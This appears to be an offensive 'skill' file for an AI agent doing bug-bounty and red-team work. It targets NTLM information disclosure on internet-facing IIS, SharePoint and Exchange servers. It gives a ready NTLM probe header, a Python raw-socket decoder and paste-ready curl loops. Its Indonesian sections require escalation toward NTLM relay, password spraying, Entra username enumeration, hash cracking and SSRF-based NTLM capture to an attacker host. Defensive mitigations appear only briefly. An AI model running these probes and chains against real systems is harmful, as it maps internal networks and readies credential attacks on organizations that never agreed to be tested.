---
name: hunt-ntlm-info
description: "Hunt NTLM/Negotiate information disclosure on internet-reachable IIS/SharePoint/Exchange. Anonymous NTLM Type-2 challenge capture leaks NetBIOS domain, internal DNS forest, computer name, AD timestamp via AV_PAIRS structure. Default Windows-installer hostnames (WIN-XXXXXXXXXXX pattern) signal lazy provisioning. Use when target advertises `WWW-Authenticate: NTLM` or `Negotiate` headers anonymously."
sources: github, authorized-engagement
report_count: 1
---

## Crown Jewel Targets

NTLM info disclosure is a **Medium-severity finding when chained to context** — the leak itself is intentional protocol behavior (RFC-compliant NTLMSSP challenge), but on internet-exposed enterprise infrastructure it provides exact reconnaissance for the next stage of an attack. Highest-value targets:

- **Internet-reachable IIS / SharePoint / Exchange / OWA** with dual-auth (Forms + NTLM, or NTLM + Kerberos)
- **Citrix NetScaler / VMware Horizon View** internet-facing gateways with NTLM-backed AD auth
- **Lync / Skype for Business / Teams On-Prem** edge servers
- **WSUS / Windows Update Services** with NTLM-protected admin paths
- **CIFS-style fileshare proxies** (HCL Sametime, IBM Notes Domino) that proxy NTLM
- **Legacy SharePoint farms** that left NTLM enabled on the public-zone IIS binding

**What makes this pay:**
- Internal AD domain disclosure (parent-forest mapping, e.g. `customer.parent-corp.example` → tenant inside corporate-AD tree)
- Default-Windows-hostname disclosure (`WIN-XXXXXXXXXXX` pattern signals rushed provisioning → likely default service-account passwords)
- Timestamp leak (used in NTLMv2 hash cracking acceleration)
- Direct attack-map enrichment for credential spraying combined with `hunt-auth-bypass` Legacy-Protocol Matrix

---

## Attack Surface Signals

**Response headers signaling NTLM availability:**
```
WWW-Authenticate: NTLM
WWW-Authenticate: Negotiate
WWW-Authenticate: NTLM, Negotiate
WWW-Authenticate: Negotiate, NTLM
```

**URL patterns where NTLM is commonly exposed:**
```
/_api/web/CurrentUser                  (SharePoint REST)
/_vti_bin/*.asmx                       (SharePoint legacy SOAP)
/EWS/Exchange.asmx                     (Exchange Web Services)
/Autodiscover/Autodiscover.xml         (Exchange autodiscover)
/owa/                                  (Outlook Web App)
/Microsoft-Server-ActiveSync           (ActiveSync)
/PowerShell                            (Exchange Mgmt Shell over HTTPS)
/api/v3/                               (TeamCity, Atlassian)
/wsus/                                 (Windows Server Update Services)
/manager/html                          (some Tomcat behind IIS)
/iisstart.htm                          (default IIS, sometimes reveals NTLM upstream)
```

**Tech-stack signals:**
- IIS on the public internet (almost always NTLM-capable, even if Forms is the front)
- SharePoint Web Front End (almost always dual-auth Forms + NTLM)
- Exchange edge transport
- Server header `Microsoft-HTTPAPI/2.0`, `Microsoft-IIS/*`, `IIS/*`

---

## Step-by-Step Hunting Methodology

1. **Probe every anonymous endpoint for `WWW-Authenticate: NTLM`.** Send a vanilla GET and inspect response headers. If NTLM is offered, proceed.

2. **Send a valid NTLMSSP Type-1 message anonymously.** The Type-1 base64 below requests NetBIOS-domain and Workstation info from the server:
   ```
   Authorization: NTLM TlRMTVNTUAABAAAAB4IIogAAAAAAAAAAAAAAAAAAAAAGAbEdAAAADw==
   ```
   This is the standard test Type-1 with negotiate flags `NTLMSSP_NEGOTIATE_UNICODE | NTLMSSP_NEGOTIATE_OEM | NTLMSSP_NEGOTIATE_NTLM | NTLMSSP_NEGOTIATE_ALWAYS_SIGN | NTLMSSP_NEGOTIATE_KEY_EXCH | NTLMSSP_NEGOTIATE_56 | NTLMSSP_NEGOTIATE_128 | NTLMSSP_NEGOTIATE_TARGET_INFO`. The `OS Version` field (`06 01 B1 1D 00 00 00 0F`) is Windows 7 build 7601 — accepted by virtually every NTLM responder.

3. **Use a keep-alive raw socket, not Python requests / curl one-shot.** Most HTTP libraries close the connection between the Type-1 send and Type-2 reception. Use one of:
   - Burp Repeater with `Connection: keep-alive` set explicitly
   - Burp `mcp__burp__send_http1_request` (handles keep-alive natively)
   - Python raw `socket` + `ssl.wrap_socket` (see Payload section)

4. **Parse the Type-2 challenge from the `WWW-Authenticate: NTLM <base64>` response header.** Base64-decode the value. The structure is NTLMSSP per MS-NLMP:
   - Bytes 0-7: literal `NTLMSSP\0`
   - Bytes 8-11: MessageType = `\x02\x00\x00\x00`
   - Bytes 12-19: TargetName SecurityBuffer (len, alloc, offset)
   - Bytes 20-23: NegotiateFlags
   - Bytes 24-31: Server Challenge (8 bytes — useful for offline cracking)
   - Bytes 40-47: TargetInfo SecurityBuffer (len, alloc, offset)
   - TargetInfo body: `AV_PAIRS` array of (AvId u16, AvLen u16, Value)

5. **Decode the AV_PAIRS.** The AvIds you care about:
   - `1` = NetBIOS Computer Name
   - `2` = NetBIOS Domain Name
   - `3` = DNS Computer Name (FQDN of the responding server)
   - `4` = DNS Domain Name (the AD domain)
   - `5` = DNS Tree Name (the AD forest root)
   - `7` = Timestamp (FILETIME, useful for NTLMv2 hash relay / cracking)
   - `9` = Target Name (in newer NTLMSSP)

6. **Map findings to severity tier:**
   - Internet-exposed + default `WIN-XXXXXXXXXXX` hostname + corporate-AD-tree disclosure → **Medium**
   - Internet-exposed + named-server hostname (`SPWEB01.corp.example`) + corporate-AD-tree → **Low-Medium**
   - Intranet-only + any disclosure → **Informational**
   - Combine with `hunt-auth-bypass` Legacy-Protocol Matrix findings on the same host → **upgrade the auth-bypass finding's severity** since the attacker has UPN/SAM format ready

7. **Check the timestamp.** If `AV[7]` returns a current FILETIME within ~5s of `Date:` header, the system clock is synced — useful intel for Kerberos golden-ticket forging (out of bug-bounty scope but red-team relevant).

8. **Cross-reference with subdomain enum.** The DNS Tree name often reveals the *parent forest* — e.g. `customer.parent-corp.example` reveals the customer is a sub-domain INSIDE corporate-parent AD, not a separate tenant. This is a privacy / topology-disclosure escalation that programs sometimes accept as Medium.

---

## Payload & Detection Patterns

**Generic NTLM Type-1 anonymous probe (curl + raw socket fallback):**
```bash
# Most one-shot curl runs DON'T return Type-2 because the connection closes.
# Use this as a quick probe to confirm NTLM is offered:
curl -sk -I -H "Authorization: NTLM TlRMTVNTUAABAAAAB4IIogAAAAAAAAAAAAAAAAAAAAAGAbEdAAAADw==" \
  "https://target.example/_api/web/CurrentUser" 2>&1 | grep -i "WWW-Authenticate"
```

**Burp `send_http1_request` (recommended for full Type-2 capture):**
```
GET /_api/web/CurrentUser HTTP/1.1
Host: target.example
Authorization: NTLM TlRMTVNTUAABAAAAB4IIogAAAAAAAAAAAAAAAAAAAAAGAbEdAAAADw==
Connection: keep-alive
User-Agent: Mozilla/5.0

```

**Python raw socket + AV_PAIR decoder:**
```python
import socket, ssl, base64, struct, re
from datetime import datetime, timezone

HOST = "target.example"
ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

s = ctx.wrap_socket(socket.create_connection((HOST, 443)), server_hostname=HOST)
s.sendall(
    f"GET /_api/web/CurrentUser HTTP/1.1\r\n"
    f"Host: {HOST}\r\n"
    "Authorization: NTLM TlRMTVNTUAABAAAAB4IIogAAAAAAAAAAAAAAAAAAAAAGAbEdAAAADw==\r\n"
    "User-Agent: Mozilla/5.0\r\nConnection: keep-alive\r\n\r\n".encode()
)
data = b""
while True:
    chunk = s.recv(8192)
    if not chunk: break
    data += chunk
    if b"\r\n\r\n" in data: break

m = re.search(rb"WWW-Authenticate:\s*NTLM\s+([A-Za-z0-9+/=]{20,})", data, re.I)
if m:
    b = base64.b64decode(m.group(1).decode("ascii"))
    assert b[:8] == b"NTLMSSP\x00"
    tn_len, _, tn_off = struct.unpack_from('<HHI', b, 12)
    ti_len, _, ti_off = struct.unpack_from('<HHI', b, 40)
    print(f"TargetName: {b[tn_off:tn_off+tn_len].decode('utf-16-le', errors='ignore')!r}")
    av_types = {1:'NetBIOS Computer Name', 2:'NetBIOS Domain Name',
                3:'DNS Computer Name', 4:'DNS Domain Name',
                5:'DNS Tree Name', 7:'Timestamp', 9:'Target Name'}
    i = 0
    ti = b[ti_off:ti_off+ti_len]
    while i < len(ti):
        av_id, av_len = struct.unpack_from('<HH', ti, i)
        if av_id == 0: break
        val = ti[i+4:i+4+av_len]
        if av_id == 7:
            ts = struct.unpack('<Q', val[:8])[0]
            secs = (ts - 116444736000000000) / 10000000
            vs = datetime.fromtimestamp(secs, tz=timezone.utc).isoformat()
        else:
            vs = val.decode('utf-16-le', errors='ignore')
        print(f"  AV[{av_id}] {av_types.get(av_id, '?'):28s}: {vs!r}")
        i += 4 + av_len
```

**Burp Collaborator NOT needed** for this finding class — the data leak is in the synchronous response, not via OOB.

---

## Common Root Causes

1. **Dual-auth IIS bindings on the public zone.** Administrators leave NTLM enabled on the public-facing IIS site even when Forms auth is the intended entry point. Internal users get SSO; external attackers get the AD topology leak.

2. **Default IIS Application Pool identity left as `ApplicationPoolIdentity`.** Combined with default hostname, signals provisioning never went past first-boot.

3. **Server never renamed from Windows-installer-generated hostname.** Microsoft's default `WIN-XXXXXXXXXXX` 11-character pattern is the immediate tell. Sometimes also `WORKGROUP\WIN-...` in older boxes.

4. **Sub-domain joined to corporate forest without zone-isolation.** European-integrator case: a a European importer's SharePoint test environment is a child domain inside a corporate global AD, disclosed via NTLM DNS Tree Name. The customer probably intends `customer.parent-corp.example` to be operationally separate but the NTLM Type-2 reveals the forest membership to anyone who probes.

5. **IIS Extended Protection NOT enabled.** When `<system.webServer><security><authentication><windowsAuthentication extendedProtection>` is `None` (the default), the NTLM challenge is sent to any anonymous client. When set to `Required`, NTLM is restricted to authenticated callers — and the AV-pair leak is mitigated.

6. **No `WindowsAuthentication` removed from `applicationHost.config` for internet-exposed sites.** SharePoint Central Admin sometimes leaves this enabled even when SP zone configuration only enables Forms.

---

## Bypass Techniques

This skill describes a disclosure leak, not an authentication bypass. The "bypass" question is: *how do defenders block this AV-pair leak while still allowing legitimate NTLM auth?*

| Defense | Effectiveness |
|---|---|
| **Disable NTLM on the public IIS binding entirely** (Forms-only) | Best — eliminates the surface |
| **IIS Extended Protection = Required** | Restricts NTLM challenge to authenticated callers; AV-pair leak mitigated |
| **Reverse-proxy strip `WWW-Authenticate` from anonymous responses** | Sometimes works but breaks legitimate clients |
| **Rate-limit the Type-1 → Type-2 endpoint** | Doesn't prevent disclosure, only slows enumeration |
| **Rename the Windows host from `WIN-XXXXXXXXXXX`** | Removes the "lazy provisioning" tell; doesn't stop the leak |
| **Move the SP/Exchange farm to a child AD with no cross-trust to corporate** | Mitigates the *forest disclosure*; doesn't stop the leak |

For the attacker: there's no "bypass" needed — the leak is the finding.

---

## Gate 0 Validation

Before writing the report, confirm:

1. **What can the attacker do RIGHT NOW with this disclosure?**
   - Internet-exposed + default hostname + corporate forest disclosed → **Medium**: attacker has UPN format for `hunt-auth-bypass` matrix probes, plus knows server has likely-default service accounts.
   - Intranet-only or only NetBIOS name → **Informational**.

2. **Does the program accept information-disclosure findings without a chained impact?**
   - Many programs (Microsoft, large enterprise VDPs) DO accept this when the leaked info includes internal AD topology.
   - Many programs (Shopify, GitHub) reject info disclosure without a chained impact.
   - Read the program scope before submitting; if borderline, chain with a Tier-A finding from `hunt-auth-bypass`.

3. **Can you reproduce in <5 minutes from a fresh shell?**
   - The Python snippet above is the canonical reproduction. Include it verbatim in the report.

---

## Real Impact Examples

### Scenario A — Enterprise SharePoint inside parent corporate AD

Target: `https://target-portal.example/` — a enterprise dealer portal (test mirror) operated by a system integrator.

Sending the anonymous Type-1 message to `/_api/web/CurrentUser` returned a Type-2 challenge whose AV_PAIRS decoded to:

```
NetBIOS Domain Name:    <CustomerName>
NetBIOS Computer Name:  WIN-XXXXXXXXXXX
DNS Domain Name:        customer.parent-corp.example
DNS Computer Name:      WIN-XXXXXXXXXXX.customer.parent-corp.example
DNS Tree Name:          customer.parent-corp.example
Timestamp:              2026-05-13T15:55:37.922Z
```

Three escalation paths:
1. **Default Windows-installer hostname (`WIN-XXXXXXXXXXX`)** — server was never renamed after OS install; strong signal of lazy provisioning. Likely default service-account passwords on the SQL backend, default WSUS config, etc.
2. **Sub-domain inside corporate-parent AD (`customer.parent-corp.example`)** — the customer is a child domain inside <ParentCorp>'s global Active Directory. A compromise of this test farm has potential cross-trust to corporate-parent.
3. **UPN format known** — combined with `hunt-auth-bypass`'s discovery of an anonymous brute-force endpoint on `/_vti_bin/Authentication.asmx`, the attacker has both the credential format (`firstname.lastname@customer.parent-corp.example` or `<CustomerName>\firstname.lastname`) and the unlimited submission endpoint.

Reported severity: **Medium**, with a note that the chain with the Authentication.asmx anonymous brute-force makes the combined attack Critical.

### Scenario B — Exchange edge with NTLM-protected EWS

Target: `https://mail.example.com/EWS/Exchange.asmx`. Type-1 probe returns Type-2 with DNS Tree Name `corp.example.com` and DNS Computer Name `MAIL01.corp.example.com`. Confirms the Exchange edge is domain-joined to corporate AD (rather than running in a DMZ-isolated AD). For an attacker with the matching `hunt-mfa-bypass` / `hunt-auth-bypass` chain, the leaked UPN format and server-name format accelerate credential spraying by removing the recon step. Reported severity: Low-Medium depending on program.

### Scenario C — Intranet-only intentional leak (not a finding)

Target: `https://intranet.corp.example` (clearly internal, behind VPN). Type-1 returns full AV-pair set. Not reportable — this is intended NTLM behavior on intranet, and the disclosure is to authenticated VPN users who already see the same data via `nltest /dsgetdc:corp.example.com`. Recognize and drop.

---

## Minimum 5 probes (wajib sebelum kelas ini boleh N/A)

| # | Probe | Kenapa ini dulu |
|---|---|---|
| 1 | Kirim `Authorization: Negotiate` → tangkap NTLM Type-2 | Informasi domain & host |
| 2 | Autodiscover/EWS endpoint: paksa respons 401 Negotiate | Target Exchange |
| 3 | Type-2 leak di header respons | Disclosures tanpa interaksi |
| 4 | Relay: coba gunakan challenge ke endpoint lain | Eskalasi ke akses |
| 5 | Endpoint tanpa auth yang memicu NTLM | Serangan tanpa kredensial |

**Aturan:** kalau salah satu probe belum dijalankan, kelas ini **belum boleh** ditulis
N/A. N/A harus menyebut probe mana yang sudah dicoba dan hasilnya.

## Eskalasi wajib (jangan berhenti di kelas ini)

**Primitif:** paksa autentikasi NTLM

**Teknik pengembangan:** relay; challenge capture; versi & hostname leak

**Eskalasi ke:** `hunt-auth-bypass` · `hunt-data-exposure`

**Depth target:** L2 -> L4

Satu temuan di kelas ini WAJIB menyebut eskalasi berikutnya (atau alasan primitif habis).
Lihat `exploit-chain-graph` + `exploit-depth` (L0-L5). `depth_gate.py` memblokir temuan
yang buktinya cuma status code.

## Runnable probes

Commands you can paste. `<TARGET>`/`<RPC>` are placeholders — fill them
from recon, do not guess endpoints.

```bash
# 0) which endpoints answer 401 + Negotiate at all?
for u in / /autodiscover/autodiscover.xml /ews/exchange.asmx /owa/ /rpc/ /_vti_bin/; do
  printf '%-32s ' "$u"
  curl -sS -o /dev/null -D - "https://<TARGET>$u" -H 'Authorization: Negotiate' \
    | grep -iE 'WWW-Authenticate|HTTP/' | tr '\n' ' '; echo
done

# 1) capture NTLM Type-2 — the actual info-leak
curl -sS -D ntlm.hdr -o /dev/null https://<TARGET>/ -H 'Authorization: NTLM TlRMTVNTUAABAAAAB4IIogAAAAAAAAAAAAAAAAAAAAAGAbEdAAAADw=='
grep -i 'www-authenticate' ntlm.hdr | sed 's/.*NTLM //' | base64 -d 2>/dev/null | xxd | head

# 2) decode the leaked fields (domain, hostname, OS version, DNS name)
python - <<'PY'
import base64, binascii, re
h = open('ntlm.hdr').read()
m = re.search(r'NTLM ([A-Za-z0-9+/=]+)', h)
b = base64.b64decode(m.group(1))
# Type-2 layout: signature(8) type(4) then payload descriptor offsets
target = b[12:20]
import struct
tlen, _, toff = struct.unpack('<HHI', target[:8])
print("TargetName:", b[toff:toff+tlen].decode('utf-16-le', 'replace'))
print("raw_hex:", binascii.hexlify(b[:64]).decode())
PY

# 3) unauth endpoint that triggers NTLM (no creds needed at all)
curl -sS -o /dev/null -D - 'https://<TARGET>/owa/auth/logon.aspx' | grep -i 'www-authenticate'

# 4) SMB/HTTP variant if 445 is reachable
smbclient -L //<TARGET> -N 2>&1 | head -15
```

**Proof bar:** the Type-2 challenge (domain/hostname/OS build) is the disclosure —
say exactly which fields leaked. NTLM relay is only a finding if you **demonstrate
the relay**; otherwise report the disclosure and describe relay as potential.

---

## Related Skills & Chains

- **`hunt-sharepoint`** — SharePoint farms emit anonymous Type-2 challenges on `/_vti_bin/` by default; this is one of the most reliable ways to get internal AD topology. Chain primitive: SharePoint discovered → NTLM Type-2 capture on `/_vti_bin/Lists.asmx` → `hunt-ntlm-info` AV_PAIR decode → internal forest name → `m365-entra-attack` ROPC spray on Entra tenant tied to that forest.
- **`m365-entra-attack`** — Leaked NetBIOS domain + UPN suffix is the missing piece for a credible password spray. Chain primitive: NTLM Type-2 yields `corp.example.com` DNS tree → cross-reference Entra tenant via `https://login.microsoftonline.com/corp.example.com/.well-known/openid-configuration` → `m365-entra-attack` AADSTS error-differential username enumeration on resolved tenant.
- **`hunt-aspnet`** — IIS sites running ASP.NET frequently expose NTLM on management paths. Chain primitive: NTLM Type-2 on `/owa/`, `/ecp/`, `/rpc/`, `/aspnet_client/` → confirm IIS + ASP.NET version → `hunt-aspnet` ViewState / `.axd` enumeration on same host.
- **`offensive-osint`** — The hostname pattern `WIN-XXXXXXXXXXX` signals lazy provisioning and predicts other weak hygiene. Chain primitive: NTLM Type-2 returns default-installer hostname → flag as low-maturity environment → `offensive-osint` deep recon (cert transparency, GitHub leakage, breach corpus correlation) is high-yield on this org.
- **`triage-validation`** — Most NTLM info-disclosure findings die at the 7-Question Gate on "is this exploitable" — pure topology disclosure is Low/Informational. Chain primitive: pull every NTLM-info finding through `triage-validation` BEFORE writing it up; only report if (a) leaks UPN format that accelerates spray, or (b) leaks production hostname mapping (`redteam-report-template` for the chain-narrative).

## 2026 sweep (dork pass 2026-10-26 — advisori terverifikasi)

- **CVE-2026-50508 — Microsoft Windows NTLM information disclosure (hingga Server 2022).** Membocorkan informasi sensitif melalui autentikasi NTLM, memungkinkan penyerang **memalsukan autentikasi melalui jaringan dan menyamar sebagai mesin atau pengguna sah**. CVSS 6.5 Medium, CWE-200.
  Lesson: kebocoran NTLM bukan cuma "informasi" — nilainya adalah **material untuk relay dan impersonation**. Saat melaporkan, sebutkan rantai potensialnya (relay ke endpoint lain) tapi jangan klaim dampak yang belum dibuktikan.
- **CVE-2026-32202 — Windows Shell: Net-NTLMv2 exposure melalui file LNK berbahaya.** Dieksploitasi di dunia nyata.
  Lesson: vektor kebocoran kredensial NTLM bisa datang dari **file**, bukan hanya dari endpoint jaringan. Kalau target menerima upload file (termasuk di area admin), pertimbangkan apakah file itu bisa memicu autentikasi NTLM saat dibuka.
- **Pola historis yang masih berlaku:** endpoint Exchange/Autodiscover, EWS, dan `/_vti_bin/` SharePoint yang memicu respons `401 Negotiate` tanpa interaksi — memberi penyerang NTLM Type-2 yang memuat nama domain, hostname, dan versi.

**Probe inti:** kirim `Authorization: Negotiate` → tangkap NTLM Type-2; paksa respons 401 Negotiate dari Autodiscover/EWS; cari Type-2 leak di header respons; dan uji endpoint tanpa auth yang memicu NTLM (serangan tanpa kredensial).


## Critical severity anchor (kelas ini bisa Critical — syaratnya)

| Kondisi | Severity |
|---|---|
| NTLM hash tertangkap → offline crack → kredensial domain | Critical |
| Endpoint yang memicu NTLM tanpa interaksi user | High (satu klik) |
| Type-2 leak di header respons (tanpa kirim apa pun) | Medium |
| Informasi versi/hostname saja | Info |

**Kalibrasi wajib:** NTLMv2 hash yang tertangkap adalah **primitif**, bukan temuan akhir. Nilai
temuan tergantung apakah hash bisa di-crack dan apa yang diberikannya. Jangan lapor "NTLM leak"
tanpa menyebut apa yang bisa diraih penyerang dengan hash itu.

## 2026 sweep

- **Vektor lewat file, bukan hanya jaringan** — kalau target menerima upload file (termasuk area
  admin), pertimbangkan apakah file itu bisa memicu autentikasi NTLM saat dibuka (mis. file
  dengan UNC path).
- **Endpoint historis yang masih hidup** — Exchange/Autodiscover, EWS, `/_vti_bin/` SharePoint
  memicu `401 Negotiate` tanpa interaksi, memberi Type-2 yang memuat nama domain, hostname, versi.
- **Responder-style capture dari SSRF** — kalau ada SSRF, arahkan ke host attacker untuk menangkap
  NTLM dari server internal.
